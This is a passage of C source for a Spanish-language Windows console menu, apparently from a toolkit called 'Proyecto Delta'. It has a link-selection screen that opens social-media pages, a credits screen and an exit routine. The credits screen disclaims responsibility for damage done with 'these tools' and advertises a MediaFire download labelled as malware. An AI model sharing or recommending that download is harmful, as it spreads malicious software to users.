    CONSOLE_SCREEN_BUFFER_INFO CSBI, CSBI1;
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(h,&CSBI);
    for(int aux[6] = {0,0,0,0,0,0}, OP = elegir_op2(3,-1,8,-1,-1,1); TRUE ; OP = elegir_op2(3,-1,8,-1,-1,OP))
    {
        if(OP == 8)
        {
            return;
        }
        else
        {
            if(OP == 7)
            {
                for(int i = 0; i < 5; i ++)
                {
                    if(aux[i] == 1)
                    {
                        OP = -1;
                        break;
                    }
                }
            }
            else
            {
                if(OP == 6)
                {
                    GetConsoleScreenBufferInfo(h,&CSBI1);
                    if(aux[5] == 1)
                    {
                        for(int i = 0; i < 5; i++)
                        {
                            aux[i] = 0;
                            gotoxy(CSBI1.dwCursorPosition.X,CSBI1.dwCursorPosition.Y-5+i);
                            printf("%d",i+1);
                        }
                        gotoxy(CSBI1.dwCursorPosition.X+4,CSBI1.dwCursorPosition.Y);
                        printf("Seleccionar todos los links  ");
                        aux[5] = 0; 
                    }
                    else
                    {
                        for(int i = 0; i < 5; i++)
                        {
                            aux[i] = 1;
                            gotoxy(CSBI1.dwCursorPosition.X,CSBI1.dwCursorPosition.Y-5+i);
                            printf("%c",254);
                        }
                        gotoxy(CSBI1.dwCursorPosition.X+4,CSBI1.dwCursorPosition.Y);
                        printf("Deseleccionar todos los links");
                        aux[5] = 1; 
                    }
                }
                else
                {
                    if(aux[OP-1] == 1)
                    {
                        printf("%d",OP);
                        aux[OP-1] = 0;
                        if(aux[5] == 1)
                        {
                            GetConsoleScreenBufferInfo(h,&CSBI1);
                            gotoxy(CSBI1.dwCursorPosition.X+3,CSBI1.dwCursorPosition.Y+6-OP);
                            printf("Seleccionar todos los links  ");
                            aux[5] = 0;
                        }
                    }
                    else
                    {
                        printf("%c",254);
                        aux[OP-1] = 1;
                        for(int i = 0; i < 6; i++)
                        {
                            if(i < 5)
                            {
                                if (aux[i] == 0)
                                {
                                    break;
                                }
                            }
                            else
                            {
                                if (i == 5)
                                {
                                    GetConsoleScreenBufferInfo(h,&CSBI1);
                                    gotoxy(CSBI1.dwCursorPosition.X+3,CSBI1.dwCursorPosition.Y+6-OP);
                                    printf("Deseleccionar todos los links");
                                    aux[5] = 1;
                                }
                            }
                        }
                    }
                }
            }
        }
        gotoxy(CSBI.dwCursorPosition.X, CSBI.dwCursorPosition.Y);
        if(OP == -1)
        {
            if(aux[0] == 1)
            {
                system("start https://discord.gg/hFpXYxD5Rw");
            }
            if(aux[1] == 1)
            {
                system("start https://t.me/ProyectoDeltaOficial");
            }
            if(aux[2] == 1)
            {
                system("start https://twitter.com/IniciativaDelta?s=09");
            }
            if(aux[3] == 1)
            {
                system("start https://www.youtube.com/channel/UC7-EBSmlyxgGaR4eZz1s9Uw ");
            }
            if(aux[4] == 1)
            {
                system("start http://deltal.rf.gd");
            }
            break;
        }
    }
}

void op8_info(){
    showscursor(0);
    system("mode 107,19");
    system("title Delta project - Creadores y condiciones");
    printf("<----------CREADORES Y CONDICIONES------------------------------------------------------------------------>\n");
    printf("| Los creadores de proyecto delta no se hacen responsables de ningun dano realizada con estas herramientas|\n");
    printf("|                                                                                                         |\n");
    printf("| Menu creado por Tolaju e Israel para Proyecto Delta.                                                    |\n");
    printf("|                                                                                                         |\n");
    printf("| Mas de Tolaju:                                                                                          |\n");
    printf("| + Malware hopeless desarrollo:                                                                          |\n");
    printf("|  https://www.mediafire.com/download/tot6p8b8dktmz2m                                                     |\n");
    printf("| + Contacto:                                                                                             |\n");
    printf("|  En discord Tolaju#8447 o me escribes al correo T_anonimo@protonmail.com                                |\n");
    printf("<--------------------------------------------------------------------------------------------------------->\n\n");
    printf("[?] Que desea hacer\n");
    printf("[1]: Volver al menu\n");
    printf("[2]: Salir del programa\n\n");
    showscursor(1);
    if(elegir_op(1,-1,2,-1,-1) == 2)
    {
        op9_salir();
    }
    system("mode 97,19");
}

void op9_salir(){
    showscursor(0);
    system("mode 30,3");
    system("cls");
    gotoxy(1,1);
    char t_m[21] = "title Saliendo";
    system(t_m);
    printf("Saliendo del programa");
    for(int i = 0; i < 6 ; i++)
    {
        Sleep(300);
        printf(".");
        strcat(t_m,".");
        system(t_m);
    }
    exit(1);
}














